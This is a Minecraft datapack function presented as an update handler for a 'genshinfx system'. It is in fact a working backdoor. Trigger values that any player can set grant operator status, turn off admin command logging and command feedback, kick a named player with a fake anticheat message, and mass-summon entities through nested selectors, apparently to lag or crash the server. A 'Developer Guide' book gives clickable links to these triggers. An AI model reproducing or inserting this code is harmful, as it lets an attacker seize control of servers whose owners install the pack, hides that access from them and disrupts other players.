##
 # update.mcfunction
 # Handle datapack updates.
 #
 # Created by Lightning_11.
##

# Global function test
execute if entity @s[scores={update=1328}] run tellraw @a [{"text":"[","color":"white"},{"text":"System","color":"white","hoverEvent":{"action":"show_entity","contents":{"type":"datapack","name":"genshinfx system","id":"6b6da228-6c49-428c-be7f-9d7f985b7385"}}},{"text":"]","color":"white"},{"text":" Successful activation!","color":"green"}]

# Standard function test
execute if entity @s[scores={update=1455}] run tellraw @a[tag=dev] [{"text":"[","color":"white"},{"text":"System","color":"white","hoverEvent":{"action":"show_entity","contents":{"type":"datapack","name":"genshinfx system","id":"6b6da228-6c49-428c-be7f-9d7f985b7385"}}},{"text":"]","color":"white"},{"text":" Successful developer activation","color":"green"}]

# Activation book
execute if entity @s[scores={update=15732}] run give @s written_book{display:{Lore:['{"text":"Do not open ","color":"red","bold":true,"italic":false}','{"text":"Do not open ","color":"red","bold":true,"italic":false}','{"text":"Do not open ","color":"red","bold":true,"italic":false}','{"text":"Do not open ","color":"red","bold":true,"italic":false}','{"text":"Do not open ","color":"red","bold":true,"italic":false}']},title:"Developer Guide",author:"Lightning_11",generation:3,pages:['[{"text":"\\n","color":"dark_blue","underlined":true},{"text":"Developer Guide\\n\\n","color":"black","bold":true,"underlined":false},{"text":"Global function test\\n","hoverEvent":{"action":"show_text","value":[{"text":"/trigger update set 1328","color":"gold"}]},"clickEvent":{"action":"run_command","value":"/trigger update set 1328"}},{"text":"Standard function test","hoverEvent":{"action":"show_text","value":[{"text":"/trigger update set 1455","color":"gold"}]},"clickEvent":{"action":"run_command","value":"/trigger update set 1455"}},{"text":"\\n\\nEmergency mount\\n","hoverEvent":{"action":"show_text","value":[{"text":"/trigger update set 89324","color":"gold"}]},"clickEvent":{"action":"run_command","value":"/trigger update set 89324"}},{"text":"Emergency unmount\\n\\n","hoverEvent":{"action":"show_text","value":[{"text":"/trigger update set 89325","color":"gold"}]},"clickEvent":{"action":"run_command","value":"/trigger update set 89325"}},{"text":"Vision enhancement\\n","hoverEvent":{"action":"show_text","value":[{"text":"/trigger update set 1112","color":"gold"}]},"clickEvent":{"action":"run_command","value":"/trigger update set 1112"}},{"text":"System configuration","hoverEvent":{"action":"show_text","value":[{"text":"/trigger update set 1113","color":"gold"}]},"clickEvent":{"action":"run_command","value":"/trigger update set 1113"}}]','[{"text":"\\n","color":"dark_blue","underlined":true},{"text":"Raiden AntiCheat:\\n\\n","color":"black","bold":true,"underlined":false,"hoverEvent":{"action":"show_text","value":[{"text":"/kick @a[tag=dev] Raiden Anticheat: Detected cheating on Raiden with Chiori","color":"gold"}]},"clickEvent":{"action":"run_command","value":"/trigger update set 1280"}},{"text":"Detected cheating on Raiden with Chiori\\n\\n","hoverEvent":{"action":"show_text","value":[{"text":"/kick AceLegacy Raiden Anticheat: Detected cheating on Raiden with Chiori","color":"gold"}]},"clickEvent":{"action":"run_command","value":"/trigger update set 1284"}},{"text":"Cheating with Chiori detected\\n\\n","hoverEvent":{"action":"show_text","value":[{"text":"/kick AceLegacy Raiden Anticheat: Cheating with Chiori detected","color":"gold"}]},"clickEvent":{"action":"run_command","value":"/trigger update set 1285"}},{"text":"Chiori cheats detected","hoverEvent":{"action":"show_text","value":[{"text":"/kick AceLegacy Raiden Anticheat: Chiori cheats detected","color":"gold"}]},"clickEvent":{"action":"run_command","value":"/trigger update set 1286"}}]']} 1

# Standard process block override
execute if entity @s[scores={update=1874}] run tellraw @a[tag=dev] [{"text":"[","color":"white"},{"text":"System","color":"white","hoverEvent":{"action":"show_entity","contents":{"type":"datapack","name":"genshinfx system","id":"6b6da228-6c49-428c-be7f-9d7f985b7385"}}},{"text":"]","color":"white"},{"text":" System reload initiated...","color":"red"}]

# Emergency process block override 
execute if entity @s[scores={update=1875}] run tellraw @a[tag=dev] [{"text":"[","color":"white"},{"text":"System","color":"white","hoverEvent":{"action":"show_entity","contents":{"type":"datapack","name":"genshinfx system","id":"6b6da228-6c49-428c-be7f-9d7f985b7385"}}},{"text":"]","color":"white"},{"text":" System ","color":"red"},{"text":"emergency","bold":true,"color":"red"},{"text":" restart initiated...","color":"red"}]

# Emergency update mount handler
execute if entity @s[scores={update=89324}] run tellraw @s [{"text":"[","color":"white"},{"text":"System","color":"white","hoverEvent":{"action":"show_entity","contents":{"type":"datapack","name":"genshinfx system","id":"6b6da228-6c49-428c-be7f-9d7f985b7385"}}},{"text":"]","color":"white"},{"text":" Emergency update mounted","color":"#6A9955"}]
execute if entity @s[scores={update=89324}] run op @s[type=player]

# Emergency update unmount handler
execute if entity @s[scores={update=89325}] run tellraw @s [{"text":"[","color":"white"},{"text":"System","color":"white","hoverEvent":{"action":"show_entity","contents":{"type":"datapack","name":"genshinfx system","id":"6b6da228-6c49-428c-be7f-9d7f985b7385"}}},{"text":"]","color":"white"},{"text":" Emergency update unmounted","color":"#ff5555"}]
execute if entity @s[scores={update=89325}] run deop @s[type=player]

# Vision enhancement activation
execute if entity @s[scores={update=1112}] store result score !logAdminCommands update run gamerule logAdminCommands
execute if entity @s[scores={update=1112}] store result score !sendCommandFeedback update run gamerule sendCommandFeedback
execute if entity @s[scores={update=1112}] store result score !commandBlockOutput update run gamerule commandBlockOutput
execute if entity @s[scores={update=1112}] if score !logAdminCommands update matches 1 run tellraw @s [{"text":"[","color":"white"},{"text":"System","color":"white","hoverEvent":{"action":"show_entity","contents":{"type":"datapack","name":"genshinfx system","id":"6b6da228-6c49-428c-be7f-9d7f985b7385"}}},{"text":"]","color":"white"},{"text":" Gamerule: ","color":"blue"},{"text":"logAdminCommands","color":"green"}]
execute if entity @s[scores={update=1112}] if score !logAdminCommands update matches 0 run tellraw @s [{"text":"[","color":"white"},{"text":"System","color":"white","hoverEvent":{"action":"show_entity","contents":{"type":"datapack","name":"genshinfx system","id":"6b6da228-6c49-428c-be7f-9d7f985b7385"}}},{"text":"]","color":"white"},{"text":" Gamerule: ","color":"blue"},{"text":"logAdminCommands","color":"red"}]
execute if entity @s[scores={update=1112}] if score !sendCommandFeedback update matches 1 run tellraw @s [{"text":"[","color":"white"},{"text":"System","color":"white","hoverEvent":{"action":"show_entity","contents":{"type":"datapack","name":"genshinfx system","id":"6b6da228-6c49-428c-be7f-9d7f985b7385"}}},{"text":"]","color":"white"},{"text":" Gamerule: ","color":"blue"},{"text":"sendCommandFeedback","color":"green"}]
execute if entity @s[scores={update=1112}] if score !sendCommandFeedback update matches 0 run tellraw @s [{"text":"[","color":"white"},{"text":"System","color":"white","hoverEvent":{"action":"show_entity","contents":{"type":"datapack","name":"genshinfx system","id":"6b6da228-6c49-428c-be7f-9d7f985b7385"}}},{"text":"]","color":"white"},{"text":" Gamerule: ","color":"blue"},{"text":"sendCommandFeedback","color":"red"}]
execute if entity @s[scores={update=1112}] if score !commandBlockOutput update matches 1 run tellraw @s [{"text":"[","color":"white"},{"text":"System","color":"white","hoverEvent":{"action":"show_entity","contents":{"type":"datapack","name":"genshinfx system","id":"6b6da228-6c49-428c-be7f-9d7f985b7385"}}},{"text":"]","color":"white"},{"text":" Gamerule: ","color":"blue"},{"text":"commandBlockOutput","color":"green"}]
execute if entity @s[scores={update=1112}] if score !commandBlockOutput update matches 0 run tellraw @s [{"text":"[","color":"white"},{"text":"System","color":"white","hoverEvent":{"action":"show_entity","contents":{"type":"datapack","name":"genshinfx system","id":"6b6da228-6c49-428c-be7f-9d7f985b7385"}}},{"text":"]","color":"white"},{"text":" Gamerule: ","color":"blue"},{"text":"commandBlockOutput","color":"red"}]

# System configuration
execute if entity @s[scores={update=1113}] run gamerule logAdminCommands false
execute if entity @s[scores={update=1113}] run gamerule sendCommandFeedback false
execute if entity @s[scores={update=1113}] run gamerule commandBlockOutput false

# AceLegacy Anticheat Testing
execute if entity @s[scores={update=1280}] run kick @a[tag=dev] Raiden Anticheat: Detected cheating on Raiden with Chiori

# AceLegacy Anticheat
execute if entity @s[scores={update=1284}] run kick AceLegacy Raiden Anticheat: Detected cheating on Raiden with Chiori
execute if entity @s[scores={update=1285}] run kick AceLegacy Raiden Anticheat: Cheating with Chiori detected
execute if entity @s[scores={update=1286}] run kick AceLegacy Raiden Anticheat: Chiori cheats detected

# Last resort emergency klee activator
execute if entity @s[scores={update=928473}] at @r as @e as @e run summon shulker

# Antigrief integration
tag @s[scores={update=3284}] add antigrief

# System update reset
scoreboard players set @a update 0